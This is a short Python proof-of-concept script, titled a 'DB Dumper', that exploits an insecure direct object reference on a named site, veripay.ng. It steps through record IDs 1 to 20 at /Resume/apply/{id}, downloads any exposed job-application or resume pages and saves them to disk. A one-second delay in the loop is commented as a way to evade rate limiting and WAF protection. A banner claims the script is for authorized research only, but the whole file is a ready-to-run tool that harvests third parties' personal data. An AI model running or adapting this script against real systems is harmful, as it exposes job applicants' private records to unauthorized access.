#!/usr/bin/env python3
import requests
import time
import os

def print_banner():
    print("="*60)
    print("  Veripay IDOR Data Extraction PoC (DB Dumper)")
    print("  Target: veripay.ng /Resume/apply/{id}")
    print("  NOTE: For authorized security research only.")
    print("="*60)

def run_extraction():
    target_base = "https://veripay.ng/Resume/apply/"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Pentest/1.0"}
    
    output_dir = "veripay_dumps"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
        print(f"[*] Created output directory: {output_dir}/")

    print(f"[*] Starting extraction against {target_base}")
    print("[*] Testing ID range 1 to 20 for proof of concept...\n")

    found_count = 0

    # Test a small range (1-20) to demonstrate the vulnerability without causing DoS
    for record_id in range(1, 21):
        url = f"{target_base}{record_id}"
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check if we got a valid page back.
            # Veripay might return 200 OK even for missing records, so we look for unique content.
            if response.status_code == 200:
                if "Submit Application" in response.text or "Job Application" in response.text:
                    found_count += 1
                    filename = f"{output_dir}/resume_record_{record_id}.html"
                    
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write(response.text)
                        
                    print(f"[+] VULNERABLE: Record {record_id} exposed. Saved to {filename}")
                else:
                    print(f"[-] Record {record_id} empty or not found.")
            elif response.status_code == 404:
                print(f"[-] Record {record_id} returns 404.")
            elif response.status_code == 403:
                print(f"[!] Access Denied for {record_id}. (IDOR might be patched!)")
            else:
                print(f"[?] Unexpected status HTTP {response.status_code} for ID {record_id}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection Error on ID {record_id}: {e}")
            
        time.sleep(1)  # Sleep to evade basic rate limiting/WAF

    print("\n" + "="*60)
    print(f"[*] Extraction complete. Successfully downloaded {found_count} records.")
    print("="*60)

if __name__ == "__main__":
    print_banner()
    run_extraction()
